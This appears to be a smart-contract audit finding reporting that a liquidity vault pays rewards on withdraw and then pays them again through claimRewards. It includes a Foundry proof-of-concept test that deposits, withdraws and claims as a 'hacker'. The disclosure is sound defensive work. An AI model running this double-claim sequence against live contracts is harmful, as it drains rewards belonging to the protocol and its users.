# [H] - Reward can be claimed again after calling withdraw with full amount

## Summary
withdraw already calls an internal function that collects the rewards. Therefore, a user can claim the rewards again even after withdrawing the full amount.

## Vulnerability Detail
The withdraw function calls the internal function _withdrawUpdateRewardState, which sends the rewards. However, even after that, when claimRewards is called, we still receive the full reward amount, which should not be possible.

Here's a test that confirms this:-
```solidity
function testCorrectness_claimAfterWithdrawPossible() public{
        vm.prank(hacker);
        liquidityVault.deposit(WSTETH_AMOUNT, 0);
        vm.warp(block.timestamp + 10);

        console2.log("Internal Rewards after DEPOSIT",ldo.balanceOf(hacker));
        console2.log("External Rewards after DEPOSIT",externalReward.balanceOf(hacker));

        uint256 hackerLpPosition = liquidityVault.lpPositions(hacker);
        console2.log("LP Position of hacker before WITHDRAW", hackerLpPosition);
        vm.prank(hacker);
        liquidityVault.withdraw(hackerLpPosition, minTokenAmounts_, true);

        console2.log("Internal Rewards after WITHDRAW",ldo.balanceOf(hacker));
        console2.log("External Rewards after WITHDRAW",externalReward.balanceOf(hacker));

        console2.log("LP Position of hacker after WITHDRAW", liquidityVault.lpPositions(hacker));

        vm.prank(hacker);
        liquidityVault.claimRewards();

        console2.log("Internal Rewards after CLAIM",ldo.balanceOf(hacker));
        console2.log("External Rewards after CLAIM",externalReward.balanceOf(hacker));
    }
```

## Impact
It is possible for anyone to easily obtain more rewards than what is allowed by the protocol.

## Tool used
Manual review, Foundry

## Recommendation
Add a check and a state variable that tracks the rewards of each person. And reduce it when the rewards are claimed.
